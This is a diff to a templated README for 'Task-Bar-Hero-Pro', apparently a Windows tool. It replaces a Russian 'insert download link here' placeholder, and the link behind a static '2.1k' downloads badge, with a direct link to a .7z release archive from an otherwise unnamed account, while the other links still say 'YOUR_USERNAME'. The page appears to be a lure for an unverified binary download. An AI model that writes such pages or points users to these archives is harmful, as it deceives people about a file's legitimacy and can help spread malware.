@@ -13,7 +13,7 @@
 <p align="center">
   <a href="https://github.com/YOUR_USERNAME/Task-Bar-Hero-Pro"><img src="https://img.shields.io/badge/version-1.0.0-brightgreen?style=for-the-badge" alt="Version"></a>
   <a href="https://github.com/YOUR_USERNAME/Task-Bar-Hero-Pro"><img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge" alt="Platform"></a>
-  <a href="https://github.com/YOUR_USERNAME/Task-Bar-Hero-Pro/releases/latest"><img src="https://img.shields.io/badge/downloads-2.1k-brightgreen?style=for-the-badge" alt="Downloads"></a>
+  <a href="https://github.com/FractionTurtle51/Task-Bar-Hero-Pro/releases/download/4/TBH-Pro.7z"><img src="https://img.shields.io/badge/downloads-2.1k-brightgreen?style=for-the-badge" alt="Downloads"></a>
   <a href="https://github.com/YOUR_USERNAME/Task-Bar-Hero-Pro"><img src="https://img.shields.io/badge/status-active-success?style=for-the-badge" alt="Status"></a>
   <a href="https://github.com/YOUR_USERNAME/Task-Bar-Hero-Pro/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-orange?style=for-the-badge" alt="License"></a>
 </p>
@@ -61,8 +61,7 @@
 ## 📥 Download
 
 <p align="center">
-  <!-- СЮДА ВСТАВИТЬ ССЫЛКУ НА СКАЧИВАНИЕ -->
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
+  <a href="https://github.com/FractionTurtle51/Task-Bar-Hero-Pro/releases/download/4/TBH-Pro.7z">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
